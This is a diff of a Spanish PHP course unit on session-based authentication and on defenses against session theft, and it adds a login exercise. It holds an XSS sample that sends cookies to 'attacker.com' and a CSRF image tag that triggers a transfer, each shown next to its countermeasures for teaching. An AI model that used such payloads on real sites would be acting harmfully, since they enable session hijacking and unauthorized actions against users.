@@ -420,6 +420,8 @@ echo "Otra vez, en el $instituto ";
 
 ## 4.5 Autentificación de usuarios
 
+### Basada en sesiones
+
 Una sesión establece una relación anónima con un usuario particular, de manera que podemos saber si es el mismo usuario entre dos peticiones distintas. Si preparamos un sistema de login, podremos saber quién utiliza nuestra aplicación.
 
 Para ello, preparemos un sencillo sistema de autenticación:
@@ -534,7 +536,7 @@ header("Location: index.php");
 !!! warning "Autenticación en producción"
     En la actualidad la autenticación de usuario no se realiza gestionando la sesión direcamente, sino que se realiza mediante algún framekwork que abstrae todo el proceso o la integración de mecanismos de autenticación tipo *OAuth*, como  estudiaremos en la última unidad mediante *Laravel*.
 
-### Mecanismos de Autenticación de usuarios
+### Otros mecanismos
 
 | **Mecanismo de Autenticación**             | **Descripción**                                                                                                           | **Implementación**                                                                                         | **Seguridad**                                                   |
 |--------------------------------------------|---------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|
@@ -548,13 +550,15 @@ header("Location: index.php");
 | **Biométrica**                             | Utiliza datos biométricos como huellas digitales o reconocimiento facial.                                                 | Se implementa generalmente en aplicaciones móviles, con PHP manejando los datos en el backend.              | Altamente seguro, pero depende del soporte del dispositivo.    |
 | **CAPTCHA**                                | Protege el formulario de inicio de sesión de bots y ataques de fuerza bruta.                                              | Usa `Google reCAPTCHA` para validar la autenticidad del usuario.                                            | Buena medida adicional para formularios públicos.              |
 
-### Protegerse contra robos de sesión
+### Robos de sesión
 
 A continuación, se describen algunos métodos comunes utilizados para robar la sesión de un usuario, junto con las contramedidas necesarias para evitar estos ataques. 
 
 #### 1. **Ataque de Cross-Site Scripting (XSS)**
-- **Descripción**: Los ataques XSS aprovechan vulnerabilidades en el código para inyectar scripts maliciosos en páginas web visitadas por otros usuarios. Estos scripts pueden acceder a las cookies de sesión y enviarlas al atacante.
-- **Ejemplo**:
+
+Los ataques XSS aprovechan vulnerabilidades en el código para inyectar scripts maliciosos en páginas web visitadas por otros usuarios. Estos scripts pueden acceder a las cookies de sesión y enviarlas al atacante.
+
+Ejemplo:
 
 ```html
 <input type="text" name="comentario" value="<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>">
@@ -562,36 +566,42 @@ A continuación, se describen algunos métodos comunes utilizados para robar la 
 
 El código inyectado envía la cookie de sesión a una URL controlada por el atacante.
 
-- **Contramedidas**:
-  - **Escapar y sanear entradas**: Utiliza funciones como `htmlspecialchars()` en PHP para escapar caracteres especiales.
+Contramedidas:
+
+  - Escapar y sanear entradas: Utiliza funciones como `htmlspecialchars()` en PHP para escapar caracteres especiales.
 
     ```php
     $comentario = htmlspecialchars($_POST['comentario'], ENT_QUOTES, 'UTF-8');
     ```
 
-  - **Política de Seguridad de Contenidos (CSP)**: Implementa CSP para restringir el origen de scripts.
+  - Política de Seguridad de Contenidos (CSP): Implementa CSP para restringir el origen de scripts.
 
     ```http
     Content-Security-Policy: script-src 'self';
     ```
 
 #### 2. **Ataque de Man-in-the-Middle (MitM)**
-- **Descripción**: Si el sitio no utiliza HTTPS, un atacante puede interceptar el tráfico y capturar cookies de sesión no cifradas.
-- **Ejemplo**: El atacante usa herramientas como Wireshark para capturar cookies en una red pública.
-- **Contramedidas**:
-  - **Usar HTTPS**: Asegura que todas las conexiones sean a través de HTTPS.
-  - **Configurar cookies como `Secure`**:
+
+Si el sitio no utiliza HTTPS, un atacante puede interceptar el tráfico y capturar cookies de sesión no cifradas.
+
+Ejemplo: El atacante usa herramientas como Wireshark para capturar cookies en una red pública.
+
+Contramedidas:
+  - Usar HTTPS: Asegura que todas las conexiones sean a través de HTTPS.
+  - Configurar cookies como `Secure`:
 
     ```php
     session_set_cookie_params(['secure' => true]);
     ```
 
 #### 3. **Robo de Cookies con Ingeniería Social o Phishing**
-- **Descripción**: El atacante engaña al usuario para que acceda a un enlace malicioso y revela su cookie de sesión.
-- **Ejemplo**: El atacante envía un enlace de phishing simulando la página de inicio de sesión.
-- **Contramedidas**:
-  - **Educación sobre phishing**: Enseña a los usuarios a identificar sitios y correos fraudulentos.
-  - **Autenticación de dos factores (2FA)**: Añade una capa extra de seguridad.
+El atacante engaña al usuario para que acceda a un enlace malicioso y revela su cookie de sesión.
+
+Ejemplo: El atacante envía un enlace de phishing simulando la página de inicio de sesión.
+
+Contramedidas:
+  - Educación sobre phishing: Enseña a los usuarios a identificar sitios y correos fraudulentos.
+  - Autenticación de dos factores (2FA): Añade una capa extra de seguridad.
 
     ```php
     // Ejemplo usando una biblioteca de 2FA como Google Authenticator
@@ -599,15 +609,16 @@ El código inyectado envía la cookie de sesión a una URL controlada por el ata
     ```
 
 #### 4. **Cross-Site Request Forgery (CSRF)**
-- **Descripción**: CSRF explota la confianza del navegador para realizar solicitudes no autorizadas en nombre del usuario autenticado.
-- **Ejemplo**: Un enlace malicioso ejecuta una solicitud usando la sesión activa del usuario.
+CSRF explota la confianza del navegador para realizar solicitudes no autorizadas en nombre del usuario autenticado.
+
+Ejemplo: Un enlace malicioso ejecuta una solicitud usando la sesión activa del usuario.
 
 ```html
 <img src="https://tusitio.com/transferir?monto=100&cuenta=atacante">
 ```
 
-- **Contramedidas**:
-  - **Uso de tokens CSRF**:
+Contramedidas:
+  - Uso de tokens CSRF:
 
     ```php
     // Generar token
@@ -620,13 +631,11 @@ El código inyectado envía la cookie de sesión a una URL controlada por el ata
     }
     ```
 
-  - **Configurar cookies con `SameSite`**:
+  - Configurar cookies con `SameSite`:
 
     ```php
     session_set_cookie_params(['samesite' => 'Strict']);
     ```
-
-
 
 ## 4.6 Referencias
 
@@ -697,9 +706,10 @@ En los siguientes ejercicios vamos a montar una estructura de inicio de sesión 
 415. `415series.php`: Añade un nueva vista similar a `413peliculas.php` que muestra un "Listado de Series" con una lista desordenada con tres series. Tanto `413peliculas.php` como la vista recien creadas, deben tener un pequeño menú (sencillo, mediante enlaces) que permita pasar de un listado a otro.
 Comprueba que si se accede directamente a cualquiera de las vistas sin tener un usuario *logueado* via URL del navegador, no se muestra el listado.
 416. Modifica tanto el controlador como las vistas para que:
-    * los datos los obtenga el controlador (almacena en la sesión un array de películas y otro de series)
-    * coloque los datos en la sesión
-    * En las vistas, los datos se recuperan de la sesión y se *pintan* en la lista desordenada recorriendo el array correspondiente.
+     * los datos los obtenga el controlador (almacena en la sesión un array de películas y otro de series)
+     * coloque los datos en la sesión
+     * En las vistas, los datos se recuperan de la sesión y se *pintan* en la lista desordenada recorriendo el array correspondiente.
+417. Selecciona uno de los mecanismos de autenticación vistos en el punto 4.5 y realiza un sistema de login utilizándolo. 
 
 ### Proyecto Videoclub 3.0
 
